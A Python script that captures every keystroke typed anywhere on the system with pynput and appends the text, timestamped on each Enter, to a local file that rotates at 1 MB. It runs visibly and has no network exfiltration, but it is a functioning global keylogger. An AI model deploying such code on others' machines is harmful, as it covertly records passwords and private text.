from pynput import keyboard
import time
from datetime import datetime
import os

class GlobalTextCapture:
    def __init__(self):
        self.buffer = []
        self.running = True
        self.last_window_switch = None
        self.filename = 'captured_text.txt'
        self.max_size_bytes = 1_000_000  # 1 MB in bytes
        
    def check_file_size(self):
        try:
            if os.path.exists(self.filename):
                if os.path.getsize(self.filename) >= self.max_size_bytes:
                    # Create backup of old file
                    backup_name = f'captured_text_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
                    os.rename(self.filename, backup_name)
                    print(f"\nFile reached 1MB. Old content backed up to {backup_name}")
                    print("Starting fresh capture file.")
        except OSError as e:
            print(f"Error handling file: {e}")
            
    def on_press(self, key):
        try:
            # Handle alphanumeric keys
            if hasattr(key, 'char'):
                self.buffer.append(key.char)
            # Handle special keys
            elif key == keyboard.Key.space:
                self.buffer.append(' ')
            elif key == keyboard.Key.enter:
                self.buffer.append('\n')
                # Save buffer to file when Enter is pressed
                self.save_buffer()
            elif key == keyboard.Key.tab:
                self.buffer.append('\t')
            elif key == keyboard.Key.backspace:
                if self.buffer:
                    self.buffer.pop()
            # Exit on Esc
            elif key == keyboard.Key.esc:
                self.running = False
                return False
                
        except AttributeError:
            pass
            
    def save_buffer(self):
        if self.buffer:
            # Check and handle file size before saving
            self.check_file_size()
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(self.filename, 'a', encoding='utf-8') as f:
                text = ''.join(self.buffer)
                f.write(f"\n[{timestamp}]\n{text}\n")
            self.buffer = []  # Clear buffer after saving
            
    def start(self):
        print("Global text capture started. Press Esc to exit.")
        print(f"Text will be saved to '{self.filename}' when you press Enter")
        print("File will be backed up and cleared when it reaches 1MB")
        
        # Start the keyboard listener
        with keyboard.Listener(on_press=self.on_press) as listener:
            while self.running:
                time.sleep(0.1)  # Reduce CPU usage
                if not self.running:
                    break
            listener.stop()
            
        # Save any remaining text before exiting
        self.save_buffer()
        print("\nText capture stopped. Check captured_text.txt for the output.")

if __name__ == "__main__":
    capture = GlobalTextCapture()
    capture.start()
